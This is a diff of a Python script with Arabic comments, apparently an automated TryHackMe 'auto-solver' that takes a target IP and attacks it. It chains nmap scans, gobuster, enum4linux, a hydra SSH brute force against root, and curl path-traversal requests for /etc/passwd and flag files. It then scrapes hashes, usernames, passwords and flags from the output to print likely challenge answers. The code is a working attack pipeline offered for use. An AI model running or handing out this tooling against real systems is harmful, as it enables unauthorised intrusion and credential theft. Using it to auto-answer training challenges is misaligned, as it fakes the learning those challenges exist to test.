@@ -3,50 +3,73 @@
 
 """
 ╔═══════════════════════════════════════════════════════════════╗
-║                 GHENA ULTIMATE - النسخة المصححة               ║
-║                     (بدون أخطاء وتعمل فوراً)                  ║
+║           GHENA THM AUTO-SOLVER - مخصص لـ TryHackMe          ║
+║                أدخل IP الهدف وانتظر النتائج                   ║
 ╚═══════════════════════════════════════════════════════════════╝
 """
 
 import subprocess
 import re
 import time
+import os
 import sys
+import concurrent.futures
 from datetime import datetime
+from threading import Lock
 
-class GhenaFixed:
+# ======================= الإعدادات =======================
+GREEN = '\033[92m'
+YELLOW = '\033[93m'
+RED = '\033[91m'
+BLUE = '\033[94m'
+CYAN = '\033[96m'
+END = '\033[0m'
+BOLD = '\033[1m'
+
+print_lock = Lock()
+def safe_print(*args, **kwargs):
+    with print_lock:
+        print(*args, **kwargs)
+
+class THMAutoSolver:
     def __init__(self, target_ip):
         self.ip = target_ip
         self.open_ports = []
         self.services = {}
-        self.flag_found = None
-        self.results_dir = f"GHENA_{target_ip}_{int(time.time())}"
-        subprocess.run(f"mkdir -p {self.results_dir}", shell=True)
+        self.cms = None
+        self.hashes = []
+        self.flags = []
+        self.web_techs = []
+        self.usernames = []
+        self.passwords = []
+        self.session_dir = f"THM_{target_ip}_{int(time.time())}"
+        os.makedirs(self.session_dir, exist_ok=True)
 
-    def log(self, msg, color=''):
-        print(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}")
+    def log(self, msg, color=BLUE):
+        timestamp = datetime.now().strftime("%H:%M:%S")
+        safe_print(f"{color}[{timestamp}] {msg}{END}")
 
-    def run_cmd(self, cmd, timeout=600):
-        self.log(f"▶️ {cmd}")
+    def run_cmd(self, cmd, timeout=120):
+        self.log(f"▶️ {cmd}", CYAN)
         try:
-            result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True, timeout=timeout)
-            # حفظ النتيجة في ملف
-            safe_cmd = cmd.replace(' ', '_').replace('/', '_')[:50]
-            with open(f"{self.results_dir}/{safe_cmd}.txt", 'w') as f:
+            result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT,
+                                           text=True, timeout=timeout)
+            # حفظ المخرجات
+            safe_name = cmd.replace(' ', '_').replace('/', '_').replace(':', '_')[:50]
+            with open(f"{self.session_dir}/{safe_name}.txt", 'w', encoding='utf-8') as f:
                 f.write(result)
             self.analyze_output(result, cmd)
             return result
         except subprocess.TimeoutExpired:
-            self.log("⏰ الأمر تجاوز الوقت المحدد، يتم تخطيه.")
-            return ""
+            self.log(f"⏰ الأمر تجاوز الوقت ({timeout} ثانية)", YELLOW)
         except subprocess.CalledProcessError as e:
-            self.log(f"⚠️ الأمر فشل (رمز {e.returncode})، يتم التخطي.")
-            return ""
+            self.log(f"⚠️ الأمر فشل (رمز {e.returncode})", YELLOW)
         except Exception as e:
-            self.log(f"❌ خطأ غير متوقع: {e}")
-            return ""
+            self.log(f"❌ خطأ: {e}", RED)
+        return ""
 
     def analyze_output(self, output, cmd):
+        """تحليل المخرجات واستخراج المعلومات الهامة لأسئلة THM"""
         # استخراج المنافذ من nmap
         if "nmap" in cmd:
             for line in output.split('\n'):
@@ -56,102 +79,175 @@ class GhenaFixed:
                     if port not in self.open_ports:
                         self.open_ports.append(port)
                         self.services[port] = svc
-                        self.log(f"🔓 منفذ {port}: {svc}")
+                        self.log(f"🔓 منفذ {port}: {svc}", GREEN)
 
-        # البحث عن العلم
-        flag_match = re.search(r'flag\{[^}]+\}|FLAG\{[^}]+\}', output)
-        if flag_match:
-            self.flag_found = flag_match.group(0)
-            self.log(f"🎯 العلم: {self.flag_found}")
+        # استخراج تقنيات الويب (whatweb)
+        if "whatweb" in cmd:
+            techs = re.findall(r'([A-Za-z0-9]+(?:-[A-Za-z0-9]+)*)\[', output)
+            for tech in techs:
+                if tech not in self.web_techs:
+                    self.web_techs.append(tech)
+            self.log(f"🌐 تقنيات ويب: {', '.join(self.web_techs)}", GREEN)
+
+        # استخراج CMS
+        cms_keywords = ['WordPress', 'Joomla', 'Drupal', 'Magento', 'Simple Image Gallery']
+        for cms in cms_keywords:
+            if cms.lower() in output.lower():
+                self.cms = cms
+                self.log(f"✅ CMS: {cms}", GREEN)
+                break
+
+        # استخراج الأعلام (THM{...})
+        flag_pattern = r'THM\{[^}]+\}'
+        matches = re.findall(flag_pattern, output, re.IGNORECASE)
+        for m in matches:
+            if m not in self.flags:
+                self.flags.append(m)
+                self.log(f"🎯 علم THM: {m}", GREEN)
+
+        # استخراج هاشات MD5 (32 حرف hex)
+        hash_pattern = r'[a-f0-9]{32}'
+        matches = re.findall(hash_pattern, output, re.IGNORECASE)
+        for m in matches:
+            if m not in self.hashes:
+                self.hashes.append(m)
+                self.log(f"🔑 هاش: {m}", GREEN)
+
+        # استخراج أسماء المستخدمين
+        user_patterns = [r'username:\s*(\S+)', r'user:\s*(\S+)', r'login:\s*(\S+)']
+        for pat in user_patterns:
+            matches = re.findall(pat, output, re.IGNORECASE)
+            for m in matches:
+                if m not in self.usernames:
+                    self.usernames.append(m)
+                    self.log(f"👤 مستخدم: {m}", GREEN)
+
+        # استخراج كلمات المرور
+        pass_patterns = [r'password:\s*(\S+)', r'pass:\s*(\S+)']
+        for pat in pass_patterns:
+            matches = re.findall(pat, output, re.IGNORECASE)
+            for m in matches:
+                if m not in self.passwords:
+                    self.passwords.append(m)
+                    self.log(f"🔐 كلمة مرور: {m}", GREEN)
+
+    def show_answers(self):
+        """عرض الإجابات المحتملة لأسئلة THM"""
+        print(f"\n{BOLD}{CYAN}{'='*60}{END}")
+        print(f"{BOLD}{CYAN}   🔍 النتائج المستخلصة (إجابات محتملة لأسئلة THM){END}")
+        print(f"{BOLD}{CYAN}{'='*60}{END}")
+
+        # سؤال 1: عدد المنافذ
+        print(f"\n{BOLD}[1] عدد المنافذ المفتوحة:{END} {GREEN}{len(self.open_ports)}{END}")
+
+        # سؤال 2: اسم CMS (إذا وُجد)
+        if self.cms:
+            print(f"{BOLD}[2] نظام إدارة المحتوى (CMS):{END} {GREEN}{self.cms}{END}")
+
+        # سؤال 3: الهاشات (قد يكون هناك أكثر من واحد)
+        if self.hashes:
+            print(f"{BOLD}[3] الهاشات المكتشفة:{END}")
+            for h in self.hashes:
+                print(f"   {GREEN}{h}{END}")
+
+        # سؤال 4: الأعلام
+        if self.flags:
+            print(f"{BOLD}[4] الأعلام (Flags):{END}")
+            for f in self.flags:
+                print(f"   {GREEN}{f}{END}")
+
+        # معلومات إضافية مفيدة
+        if self.usernames:
+            print(f"{BOLD}[+] أسماء المستخدمين:{END}")
+            for u in self.usernames:
+                print(f"   {YELLOW}{u}{END}")
+
+        if self.passwords:
+            print(f"{BOLD}[+] كلمات المرور:{END}")
+            for p in self.passwords:
+                print(f"   {YELLOW}{p}{END}")
+
+        if self.web_techs:
+            print(f"{BOLD}[+] تقنيات الويب:{END} {', '.join(self.web_techs)}")
+
+        print(f"\n{CYAN}{'='*60}{END}")
+
+        # حفظ النتائج في ملف
+        with open(f"{self.session_dir}/answers.txt", 'w') as f:
+            f.write(f"ports: {len(self.open_ports)}\n")
+            f.write(f"cms: {self.cms}\n")
+            f.write(f"hashes: {self.hashes}\n")
+            f.write(f"flags: {self.flags}\n")
+            f.write(f"usernames: {self.usernames}\n")
+            f.write(f"passwords: {self.passwords}\n")
+            f.write(f"web_techs: {self.web_techs}\n")
+
+        self.log(f"✅ تم حفظ النتائج في {self.session_dir}/answers.txt", GREEN)
 
     def run(self):
-        self.log("="*60)
-        self.log(f"🚀 بدء الهجوم التلقائي على {self.ip}")
-        self.log("="*60)
+        self.log("="*60, CYAN)
+        self.log(f"{BOLD}🚀 بدء الهجوم على {self.ip} (TryHackMe){END}", CYAN)
+        self.log("="*60, CYAN)
 
-        # 1. فحص سريع (nmap أساسي)
+        # 1. فحص nmap سريع
+        self.log("\n📌 [1] فحص nmأساسي", BOLD)
         self.run_cmd(f"nmap -sV -T4 {self.ip}")
 
-        if self.flag_found:
-            self.show_flag()
-            return
+        # 2. إذا عدد المنافذ قليل، فحص شامل
+        if len(self.open_ports) < 10:
+            self.log("\n📌 [2] فحص شامل للمنافذ", BOLD)
+            self.run_cmd(f"nmap -sC -sV -p- -T4 {self.ip}", timeout=600)
 
-        # 2. فحص جميع المنافذ (مع وقت أقصى 1200 ثانية)
-        self.log("\n📌 فحص جميع المنافذ (قد يستغرق وقتاً)...")
-        self.run_cmd(f"nmap -sC -sV -p- -T4 {self.ip}", timeout=1200)
-
-        # 3. هجمات حسب الخدمات المكتشفة
-        for port in self.open_ports:
-            svc = self.services.get(port, '').lower()
-            
-            # الويب
-            if port in [80, 443, 8080, 8443] or 'http' in svc:
+        # 3. فحص الويب (إذا وجد منافذ ويب)
+        web_ports = [p for p in self.open_ports if p in [80, 443, 8080, 8443] or 'http' in self.services.get(p, '')]
+        if web_ports:
+            self.log("\n📌 [3] فحص الويب", BOLD)
+            for port in web_ports:
                 protocol = 'https' if port in [443, 8443] else 'http'
-                self.log(f"\n🌐 فحص الويب على المنفذ {port}")
-                
-                # Gobuster (تصحيح الاسم)
+                self.run_cmd(f"whatweb {protocol}://{self.ip}:{port}")
                 self.run_cmd(f"gobuster dir -u {protocol}://{self.ip}:{port} -w /usr/share/wordlists/dirb/common.txt -t 50")
-                
-                # Nikto
-                self.run_cmd(f"nikto -h {protocol}://{self.ip}:{port}")
-                
-                # LFI test (تصحيح المسار)
-                self.run_cmd(f"curl -s '{protocol}://{self.ip}:{port}/?page=../../../../etc/passwd'")
-                
-            # SMB
-            if port in [139, 445] or 'smb' in svc or 'microsoft-ds' in svc:
-                self.log(f"\n📁 فحص SMB")
-                self.run_cmd(f"enum4linux -a {self.ip}")
-                
-            # FTP
-            if port == 21 or 'ftp' in svc:
-                self.log(f"\n📂 فحص FTP")
-                self.run_cmd(f"nmap --script ftp-anon -p 21 {self.ip}")
-                
-            # SSH
-            if port == 22 or 'ssh' in svc:
-                self.log(f"\n🔐 فحص SSH")
-                # حاول باستخدام قاموس صغير (rockyou كبير جداً قد يعلق)
-                self.run_cmd(f"hydra -l root -P /usr/share/wordlists/fasttrack.txt ssh://{self.ip} -t 4", timeout=300)
 
-        # 4. بحث متقدم عن العلم في مسارات شائعة
-        if not self.flag_found and any(p in [80, 443, 8080, 8443] for p in self.open_ports):
-            self.log("\n🔍 بحث متقدم عن العلم...")
-            paths = [
-                "/flag.txt", "/root/flag.txt", "/home/*/flag.txt",
-                "/var/www/flag.txt", "/tmp/flag.txt", "/.flag",
-                "/root/root.txt", "/root/root.flag"
-            ]
-            for path in paths:
-                if self.flag_found:
-                    break
-                for port in [p for p in self.open_ports if p in [80, 443, 8080, 8443]]:
-                    protocol = 'https' if port in [443, 8443] else 'http'
-                    # محاولة LFI مباشرة
+        # 4. فحص SMB
+        if any(p in [139,445] for p in self.open_ports):
+            self.log("\n📌 [4] فحص SMB", BOLD)
+            self.run_cmd(f"enum4linux -a {self.ip}")
+
+        # 5. فحص FTP
+        if 21 in self.open_ports:
+            self.log("\n📌 [5] فحص FTP", BOLD)
+            self.run_cmd(f"nmap --script ftp-anon -p 21 {self.ip}")
+
+        # 6. فحص SSH
+        if 22 in self.open_ports:
+            self.log("\n📌 [6] فحص SSH", BOLD)
+            self.run_cmd(f"hydra -l root -P /usr/share/wordlists/fasttrack.txt ssh://{self.ip} -t 4", timeout=300)
+
+        # 7. بحث عن العلم في مسارات شائعة
+        if web_ports:
+            self.log("\n📌 [7] بحث عن الأعلام", BOLD)
+            common_paths = ["/flag.txt", "/root/flag.txt", "/var/www/flag.txt", "/home/*/flag.txt"]
+            for port in web_ports:
+                protocol = 'https' if port in [443,8443] else 'http'
+                for path in common_paths:
+                    self.run_cmd(f"curl -s {protocol}://{self.ip}:{port}{path}")
                     self.run_cmd(f"curl -s '{protocol}://{self.ip}:{port}/?page=../../../../..{path}'")
-                    # محاولة الوصول المباشر
-                    self.run_cmd(f"curl -s '{protocol}://{self.ip}:{port}{path}'")
 
-        self.show_flag()
-
-    def show_flag(self):
-        if self.flag_found:
-            print("\n" + "="*60)
-            print(f"🎯🎯🎯 العلم النهائي: {self.flag_found} 🎯🎯🎯")
-            print("="*60)
-            # حفظ العلم في ملف
-            with open(f"{self.results_dir}/FLAG.txt", 'w') as f:
-                f.write(self.flag_found)
-        else:
-            print("\n❌ لم يتم العثور على العلم. راجع ملفات النتائج.")
+        # 8. عرض الإجابات
+        self.show_answers()
 
 if __name__ == "__main__":
-    print("\n" + "="*60)
-    print("GHENA ULTIMATE - النسخة المصححة (بدون أخطاء)")
-    print("="*60)
-    ip = input("IP الهدف: ").strip()
-    if ip:
-        bot = GhenaFixed(ip)
-        bot.run()
-    else:
-        print("❌ الرجاء إدخال IP صحيح.")
+    print(f"\n{BOLD}{CYAN}{'='*60}{END}")
+    print(f"{BOLD}{CYAN}   GHENA THM AUTO-SOLVER - مخصص لـ TryHackMe{END}")
+    print(f"{BOLD}{CYAN}{'='*60}{END}")
+    ip = input(f"{BOLD}أدخل IP الهدف: {END}").strip()
+    if not ip:
+        print(f"{RED}❌ IP مطلوب{END}")
+        sys.exit(1)
+    solver = THMAutoSolver(ip)
+    try:
+        solver.run()
+    except KeyboardInterrupt:
+        print(f"\n{YELLOW}⏹️ تم الإيقاف بواسطة المستخدم{END}")
+        solver.show_answers()
+    except Exception as e:
+        print(f"{RED}❌ خطأ غير متوقع: {e}{END}")
